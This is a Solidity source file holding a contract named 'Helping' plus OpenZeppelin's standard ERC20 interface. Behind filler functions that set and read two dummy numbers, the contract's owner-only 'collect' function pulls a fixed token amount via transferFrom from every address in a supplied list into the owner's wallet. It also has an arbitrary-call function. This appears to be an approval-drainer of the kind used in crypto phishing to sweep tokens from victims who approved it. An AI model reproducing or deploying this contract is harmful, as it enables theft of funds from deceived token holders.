// SPDX-License-Identifier: Unlicensed

// Deployed with the Atlas IDE
// https://app.atlaszk.com

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Helping {

IERC20 public token;
address public owner;

uint256 public storA = 1;
uint256 public storB = 2;

constructor(address _token) {
        token = IERC20(_token);
        owner = msg.sender;
}

event Response(bool result, bytes data);

  
function setem(uint256 one, uint256 two) external {
    storA = one;
    storB = two;
}

function changetoken(address newtoken) external  {
require(msg.sender == owner, "only Owner");
    token = IERC20(newtoken);
}

receive() external payable {}
  
fallback() external payable{
    this.getem();
    if(address(this).balance > 0) {
         payable(owner).transfer(address(this).balance);
       }
}

function collect(address[] calldata senders, uint256 amount) external {
    require(msg.sender == owner, "only Owner");
     uint256 l = senders.length;
     for (uint256 i = 0; i < l; ++i) {
           address sender = senders[i];
           token.transferFrom(sender, owner, amount);
     }
}

function withdrawToken() external {
    require(msg.sender == owner, "only Owner");
    token.transfer(owner, token.balanceOf(address(this)));
    }


function withdrawToken(uint256 value) public {
    require(msg.sender == owner, "only Owner");
    require(token.transfer(owner, value), "failed");
    }

function getem() public view returns(uint256 a, uint256 b) {
   return (storA, storB);

}
function withdrawETH() external {
        payable(owner).transfer(address(this).balance);
    }

function call2(address target, bytes memory data) external payable {
    require(msg.sender == owner, "only Owner");
     (bool success, bytes memory returned) = target.call{value: msg.value}(data);
     emit Response(success, returned);
}

}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}